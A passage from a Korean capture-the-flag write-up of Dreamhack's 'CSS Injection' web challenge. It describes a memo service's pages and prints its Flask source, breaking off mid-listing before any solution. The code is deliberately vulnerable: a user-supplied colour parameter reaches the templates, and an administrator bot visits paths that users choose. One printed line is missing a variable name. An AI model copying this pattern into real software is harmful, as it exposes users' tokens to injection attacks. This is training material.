---
title: "드림핵 lv.3 - CSS Injection"
date: 2025-03-25 00:00:00 +0800
categories: [Wargame, Dreamhack]
tags: [cyber security, writeup, dreamhack, web hacking, css injection] 
description: 드림핵 CSS Injection 웹해킹 워게임 풀이
---

[https://dreamhack.io/wargame/challenges/421](https://dreamhack.io/wargame/challenges/421)
# 문제 설명
Exercise: CSS Injection에서 실습하는 문제입니다.

---
# 문제 풀이
## 웹사이트 분석
메인 페이지에 접속하면 "Hello! Private Memo Service"라는 문구가 나온다.<br />
### 로그인 전
그리고 위에 내비게이션 바가 있다. 각 버튼은 "Home", "Memo", "Report", "Login"이 있다.
* Home: 메인 페이지로 이동한다.
* Memo: 메모를 입력할 수 있는 페이지로 이동하고 내가 지금까지 적었던 메모들의 리스트를 볼 수 있다. 로그인을 해야만 접속이 가능하다.
* Report: 에러가 있는 페이지를 제보하는 페이지이다. http://127.0.0.1:8000/ 서버의 아래 subpath를 유저가 직접 지정할 수 있다.
* Login: 로그인 페이지로 이동한다. 테스트로 guest, guest 그리고 admin, admin으로 로그인을 시도해보니 먹히지 않는다. 로그인 말고 register 버튼도 있어서 회원가입도 가능하다. 
### 로그인 후
회원가입을 하고 로그인을 하면 다시 메인 페이지로 이동이 된다. 그리고 위의 내비게이션 바가 조금 변한다.<br />
"Login" 페이지가 "Logout"으로 변하고 나의 유저이름을 표시하는 부분과 Mypage 버튼이 새로 생긴다.<br />
Mypage 페이지로 이동하면 내 유저 아이디와 유저 이름 그리고 API 토큰이 출력된다.
## 코드 분석
<details>
<summary>코드 보기</summary>
<pre><span class="n">python</span>
<span class="c1">#!/usr/bin/python3
</span><span class="kn">import</span> <span class="n">hashlib</span><span class="p">,</span> <span class="n">os</span><span class="p">,</span> <span class="n">binascii</span><span class="p">,</span> <span class="n">random</span><span class="p">,</span> <span class="n">string</span>
<span class="kn">from</span> <span class="n">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">redirect</span><span class="p">,</span> <span class="n">url_for</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">g</span><span class="p">,</span> <span class="n">flash</span>
<span class="kn">from</span> <span class="n">functools</span> <span class="kn">import</span> <span class="n">wraps</span>
<span class="kn">import</span> <span class="n">sqlite3</span>
<span class="kn">from</span> <span class="n">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
<span class="kn">from</span> <span class="n">selenium.webdriver.chrome.service</span> <span class="kn">import</span> <span class="n">Service</span>
<span class="kn">from</span> <span class="n">selenium.webdriver.common.by</span> <span class="kn">import</span> <span class="n">By</span>
<span class="kn">from</span> <span class="n">promise</span> <span class="kn">import</span> <span class="n">Promise</span>

<span class="n">app</span> <span class="o">=</span> <span class="nc">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
<span class="n">app</span><span class="p">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>

<span class="n">DATABASE</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">environ</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">DATABASE</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">database.db</span><span class="sh">"</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">FLAG</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">./flag.txt</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">r</span><span class="sh">"</span><span class="p">).</span><span class="nf">read</span><span class="p">().</span><span class="nf">strip</span><span class="p">()</span>
<span class="k">except</span><span class="p">:</span>
    <span class="n">FLAG</span> <span class="o">=</span> <span class="sh">"</span><span class="s">[**FLAG**]</span><span class="sh">"</span>

<span class="n">ADMIN_USERNAME</span> <span class="o">=</span> <span class="sh">"</span><span class="s">administrator</span><span class="sh">"</span>
<span class="n">ADMIN_PASSWORD</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">hexlify</span><span class="p">(</span><span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">execute</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">()):</span>
    <span class="n"></span> <span class="o">=</span> <span class="n">sqlite3</span><span class="p">.</span><span class="nf">connect</span><span class="p">(</span><span class="n">DATABASE</span><span class="p">)</span>
    <span class="n">cur</span> <span class="o">=</span> <span class="n">con</span><span class="p">.</span><span class="nf">cursor</span><span class="p">()</span>
    <span class="n">cur</span><span class="p">.</span><span class="nf">execute</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
    <span class="n">con</span><span class="p">.</span><span class="nf">commit</span><span class="p">()</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="nf">fetchall</span><span class="p">()</span>
    <span class="n">con</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">data</span>

<span class="k">def</span> <span class="nf">token_generate</span><span class="p">():</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">token</span> <span class="o">=</span> <span class="sh">""</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="nf">choice</span><span class="p">(</span><span class="n">string</span><span class="p">.</span><span class="n">ascii_lowercase</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
        <span class="n">token_exists</span> <span class="o">=</span> <span class="nf">execute</span><span class="p">(</span>
            <span class="sh">"</span><span class="s">SELECT * FROM users WHERE token = :token;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">:</span> <span class="n">token</span><span class="p">}</span>
        <span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">token_exists</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">token</span>

<span class="k">def</span> <span class="nf">login_required</span><span class="p">(</span><span class="n">view</span><span class="p">):</span>
    <span class="nd">@wraps</span><span class="p">(</span><span class="n">view</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">wrapped_view</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">session</span> <span class="ow">and</span> <span class="n">session</span><span class="p">[</span><span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">]:</span>
            <span class="k">return</span> <span class="nf">view</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">"</span><span class="s">login first !</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">))</span>

    <span class="k">return</span> <span class="n">wrapped_view</span>

<span class="k">def</span> <span class="nf">apikey_required</span><span class="p">(</span><span class="n">view</span><span class="p">):</span>
    <span class="nd">@wraps</span><span class="p">(</span><span class="n">view</span><span class="p">)</span>
    <span class="k">def</span> <span class="nf">wrapped_view</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
        <span class="n">apikey</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">API-KEY</span><span class="sh">"</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
        <span class="n">token</span> <span class="o">=</span> <span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM users WHERE token = :token;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">:</span> <span class="n">apikey</span><span class="p">})</span>
        <span class="k">if</span> <span class="n">token</span><span class="p">:</span>
            <span class="n">request</span><span class="p">.</span><span class="n">uid</span> <span class="o">=</span> <span class="n">token</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
            <span class="k">return</span> <span class="nf">view</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">{</span><span class="sh">"</span><span class="s">code</span><span class="sh">"</span><span class="p">:</span> <span class="mi">401</span><span class="p">,</span> <span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Access Denined !</span><span class="sh">"</span><span class="p">}</span>

    <span class="k">return</span> <span class="n">wrapped_view</span>

<span class="nd">@app.teardown_appcontext</span>
<span class="k">def</span> <span class="nf">close_connection</span><span class="p">(</span><span class="n">exception</span><span class="p">):</span>
    <span class="n">db</span> <span class="o">=</span> <span class="nf">getattr</span><span class="p">(</span><span class="n">g</span><span class="p">,</span> <span class="sh">"</span><span class="s">_database</span><span class="sh">"</span><span class="p">,</span> <span class="bp">None</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">db</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
        <span class="n">db</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="nd">@app.context_processor</span>
<span class="k">def</span> <span class="nf">background_color</span><span class="p">():</span>
    <span class="n">color</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">args</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">color</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">white</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">dict</span><span class="p">(</span><span class="n">color</span><span class="o">=</span><span class="n">color</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">"</span><span class="s">index.html</span><span class="sh">"</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/login</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">"</span><span class="s">login.html</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">user</span> <span class="o">=</span> <span class="nf">execute</span><span class="p">(</span>
            <span class="sh">"</span><span class="s">SELECT * FROM users WHERE username = :username and password = :password;</span><span class="sh">"</span><span class="p">,</span>
            <span class="p">{</span>
                <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
                <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">(),</span>
            <span class="p">},</span>
        <span class="p">)</span>

        <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
            <span class="n">session</span><span class="p">[</span><span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
            <span class="n">session</span><span class="p">[</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">]</span> <span class="o">=</span> <span class="n">user</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]</span>
            <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">))</span>

        <span class="nf">flash</span><span class="p">(</span><span class="sh">"</span><span class="s">Wrong username or password !</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/logout</span><span class="sh">"</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">logout</span><span class="p">():</span>
    <span class="n">session</span><span class="p">.</span><span class="nf">clear</span><span class="p">()</span>
    <span class="nf">flash</span><span class="p">(</span><span class="sh">"</span><span class="s">Logout !</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">"</span><span class="s">index</span><span class="sh">"</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/register</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">"</span><span class="s">register.html</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">)</span>

        <span class="n">user</span> <span class="o">=</span> <span class="nf">execute</span><span class="p">(</span>
            <span class="sh">"</span><span class="s">SELECT * FROM users WHERE username = :username;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">}</span>
        <span class="p">)</span>
        <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">"</span><span class="s">Username already exists !</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">"</span><span class="s">register</span><span class="sh">"</span><span class="p">))</span>

        <span class="n">token</span> <span class="o">=</span> <span class="nf">token_generate</span><span class="p">()</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="sh">"</span><span class="s">INSERT INTO users(username, password, token) VALUES (:username, :password, :token);</span><span class="sh">"</span>
        <span class="nf">execute</span><span class="p">(</span>
            <span class="n">sql</span><span class="p">,</span>
            <span class="p">{</span>
                <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
                <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">:</span> <span class="n">hashlib</span><span class="p">.</span><span class="nf">sha256</span><span class="p">(</span><span class="n">password</span><span class="p">.</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">hexdigest</span><span class="p">(),</span>
                <span class="sh">"</span><span class="s">token</span><span class="sh">"</span><span class="p">:</span> <span class="n">token</span><span class="p">,</span>
            <span class="p">},</span>
        <span class="p">)</span>
        <span class="nf">flash</span><span class="p">(</span><span class="sh">"</span><span class="s">Register Success.</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">"</span><span class="s">login</span><span class="sh">"</span><span class="p">))</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/mypage</span><span class="sh">"</span><span class="p">)</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">mypage</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM users WHERE uid = :uid;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">:</span> <span class="n">session</span><span class="p">[</span><span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">]})</span>
    <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">"</span><span class="s">mypage.html</span><span class="sh">"</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/memo</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="nd">@login_required</span>
<span class="k">def</span> <span class="nf">memopage</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">:</span>
        <span class="n">memos</span> <span class="o">=</span> <span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM memo WHERE uid = :uid;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">:</span> <span class="n">session</span><span class="p">[</span><span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">]})</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">"</span><span class="s">memo.html</span><span class="sh">"</span><span class="p">,</span> <span class="n">memos</span><span class="o">=</span><span class="n">memos</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">memo</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">memo</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">sql</span> <span class="o">=</span> <span class="sh">"</span><span class="s">INSERT INTO memo(uid, text) VALUES(:uid, :text);</span><span class="sh">"</span>
        <span class="nf">execute</span><span class="p">(</span><span class="n">sql</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">:</span> <span class="n">session</span><span class="p">[</span><span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">],</span> <span class="sh">"</span><span class="s">text</span><span class="sh">"</span><span class="p">:</span> <span class="n">memo</span><span class="p">})</span>
    <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">"</span><span class="s">memopage</span><span class="sh">"</span><span class="p">))</span>

<span class="c1"># report
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/report</span><span class="sh">"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">report</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">POST</span><span class="sh">"</span><span class="p">:</span>
        <span class="n">path</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">path</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="ow">not</span> <span class="n">path</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">"</span><span class="s">fail.</span><span class="sh">"</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">"</span><span class="s">report</span><span class="sh">"</span><span class="p">))</span>

        <span class="k">if</span> <span class="n">path</span> <span class="ow">and</span> <span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="sh">"</span><span class="s">/</span><span class="sh">"</span><span class="p">:</span>
            <span class="n">path</span> <span class="o">=</span> <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>

        <span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">http://127.0.0.1:8000/</span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="sh">"</span>
        <span class="k">if</span> <span class="nf">check_url</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">"</span><span class="s">success.</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nf">flash</span><span class="p">(</span><span class="sh">"</span><span class="s">fail.</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="nf">url_for</span><span class="p">(</span><span class="sh">"</span><span class="s">report</span><span class="sh">"</span><span class="p">))</span>

    <span class="k">elif</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="sh">"</span><span class="s">GET</span><span class="sh">"</span><span class="p">:</span>
        <span class="k">return</span> <span class="nf">render_template</span><span class="p">(</span><span class="sh">"</span><span class="s">report.html</span><span class="sh">"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">check_url</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">service</span> <span class="o">=</span> <span class="nc">Service</span><span class="p">(</span><span class="n">executable_path</span><span class="o">=</span><span class="sh">"</span><span class="s">/chromedriver</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">options</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">ChromeOptions</span><span class="p">()</span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="p">[</span>
            <span class="sh">"</span><span class="s">headless</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">window-size=1920x1080</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">disable-gpu</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">no-sandbox</span><span class="sh">"</span><span class="p">,</span>
            <span class="sh">"</span><span class="s">disable-dev-shm-usage</span><span class="sh">"</span><span class="p">,</span>
        <span class="p">]:</span>
            <span class="n">options</span><span class="p">.</span><span class="nf">add_argument</span><span class="p">(</span><span class="n">_</span><span class="p">)</span>
        <span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="p">.</span><span class="nc">Chrome</span><span class="p">(</span><span class="n">service</span><span class="o">=</span><span class="n">service</span><span class="p">,</span> <span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>
        <span class="n">driver</span><span class="p">.</span><span class="nf">implicitly_wait</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
        <span class="n">driver</span><span class="p">.</span><span class="nf">set_page_load_timeout</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

        <span class="n">driver_promise</span> <span class="o">=</span> <span class="nc">Promise</span><span class="p">(</span><span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://127.0.0.1:8000/login</span><span class="sh">"</span><span class="p">))</span>
        <span class="n">driver_promise</span><span class="p">.</span><span class="nf">then</span><span class="p">(</span>
            <span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">NAME</span><span class="p">,</span> <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">).</span><span class="nf">send_keys</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="n">ADMIN_USERNAME</span><span class="p">))</span>
        <span class="p">)</span>
        <span class="n">driver_promise</span><span class="p">.</span><span class="nf">then</span><span class="p">(</span>
            <span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">NAME</span><span class="p">,</span> <span class="sh">"</span><span class="s">password</span><span class="sh">"</span><span class="p">).</span><span class="nf">send_keys</span><span class="p">(</span><span class="n">ADMIN_PASSWORD</span><span class="p">.</span><span class="nf">decode</span><span class="p">())</span>
        <span class="p">)</span>
        <span class="n">driver_promise</span> <span class="o">=</span> <span class="nc">Promise</span><span class="p">(</span><span class="n">driver</span><span class="p">.</span><span class="nf">find_element</span><span class="p">(</span><span class="n">By</span><span class="p">.</span><span class="n">ID</span><span class="p">,</span> <span class="sh">"</span><span class="s">submit</span><span class="sh">"</span><span class="p">).</span><span class="nf">click</span><span class="p">())</span>
        <span class="n">driver_promise</span><span class="p">.</span><span class="nf">then</span><span class="p">(</span><span class="n">driver</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="p">))</span>

    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="n">driver</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>
        <span class="k">return</span> <span class="bp">False</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="n">driver</span><span class="p">.</span><span class="nf">quit</span><span class="p">()</span>
    <span class="k">return</span> <span class="bp">True</span>

<span class="c1"># API
</span><span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/api/me</span><span class="sh">"</span><span class="p">)</span>
<span class="nd">@apikey_required</span>
<span class="k">def</span> <span class="nf">APIme</span><span class="p">():</span>
    <span class="n">user</span> <span class="o">=</span> <span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM users WHERE uid = :uid;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">uid</span><span class="p">})</span>
    <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">{</span><span class="sh">"</span><span class="s">code</span><span class="sh">"</span><span class="p">:</span> <span class="mi">200</span><span class="p">,</span> <span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">:</span> <span class="n">user</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">],</span> <span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">user</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">1</span><span class="p">]}</span>
    <span class="k">return</span> <span class="p">{</span><span class="sh">"</span><span class="s">code</span><span class="sh">"</span><span class="p">:</span> <span class="mi">500</span><span class="p">,</span> <span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">Error !</span><span class="sh">"</span><span class="p">}</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/api/memo</span><span class="sh">"</span><span class="p">)</span>
<span class="nd">@apikey_required</span>
<span class="k">def</span> <span class="nf">APImemo</span><span class="p">():</span>
    <span class="n">memos</span> <span class="o">=</span> <span class="nf">execute</span><span class="p">(</span><span class="sh">"</span><span class="s">SELECT * FROM memo WHERE uid = :uid;</span><span class="sh">"</span><span class="p">,</span> <span class="p">{</span><span class="sh">"</span><span class="s">uid</span><span class="sh">"</span><span class="p">:</span> <span class="n">request</span><span class="p">.</span><span class="n">uid</span><span class="p">})</span>
    <span class="k">if</span> <span class="n">memos</span><span class="p">:</span>
        <span class="n">memo</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">tmp</span> <span class="ow">in</span> <span class="n">memos</span><span class="p">:</span>
